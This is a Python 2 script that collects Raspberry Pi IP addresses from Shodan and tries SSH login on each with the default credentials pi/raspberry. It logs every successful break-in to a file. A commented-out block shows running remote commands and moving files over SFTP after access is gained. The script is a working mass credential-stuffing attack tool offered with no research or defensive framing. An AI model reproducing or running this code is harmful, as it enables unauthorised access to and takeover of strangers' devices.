import os
import sys
import paramiko
import shodan
import argparse
parser = argparse.ArgumentParser()
parser.add_argument("filenm", help="target file", type=str)
args = parser.parse_args()
target_file = str(args.filenm).replace(' ','')


#Define Shodan Api key--
shodan_api = "Your Api Key Here"


#Check if target list is available or not.
if(os.path.isfile('./'+target_file)==False or os.path.getsize(target_file)==0):
        print "File not found"
        api = shodan.Shodan(shodan_api)
        try:
                results = api.search('raspberry')
                with open(target_file,'a') as ras:
                        for addr in results['matches']:
                                ras.write(addr['ip_str']+'\n')
                ras.close()
        except shodan.APIError, e:
                print 'Error: %s'%e
                sys.exit()

#Variables
log_filename = 'paramiko_log.txt'
i = 0
success = 0
err = 0

#Main program:
while (True):
        print "\n----------\nIteration - %d\nTotal Successful ip(s) - %d"%(i,success)
        with open(target_file,'r') as f:
                lines = f.readlines()
        try:
                server = lines[i]
                print "\n----- Now testing - %s -----"%server
                username = 'pi'
                password = 'raspberry'
                #server, username, password = ('196.68.212.43', 'pi', 'raspberry')
                try:
                        ssh = paramiko.SSHClient()
                        paramiko.util.log_to_file(log_filename)
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        #In case the server's key is unknown,
                        #we will be adding it automatically to the list of known hosts
                        #Loads the user's local known host file.
                        ssh.load_host_keys(os.path.expanduser(os.path.join("~", ".ssh", "known_hosts")))
                        #Connection initiated..., set the value for timeout 
                        conn = ssh.connect(server, username=username, password=password, timeout=40)
                        if conn is None:
                                print "Connection success for IP-%s\ngoing to next ip"%server
                                success = success + 1                             
                                with open('success_ip.txt','a') as fl:
                                        fl.write(server)
                                fl.close()                                                                
                                i = i+1
                                ssh.close()
                        else:
                                print "IP-%s failed!,going to next ip..."%server
                                i = i+1  
                        f.close()
                        last.close()                        
                except KeyboardInterrupt:
                        print "\n\nExiting..."
                        sys.exit()
                except:
                        #print "some error occurred, going to next ip..."
                        i = i+1
                        f.close()
        except:
                f.close()
                print "-------- Finished --------"
                sys.exit()

'''
#Error handling---
ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command('ls /tmp')
#Reading output of the executed command
print "output", ssh_stdout.read()                
error = ssh_stderr.read()
#Reading the error stream of the executed command
print "error:", error, len(error)
#Transfering files to and from the remote machine
sftp = ssh.open_sftp()
sftp.get(remote_path, local_path)
sftp.put(local_path, remote_path)
sftp.close()
ssh.close()'''
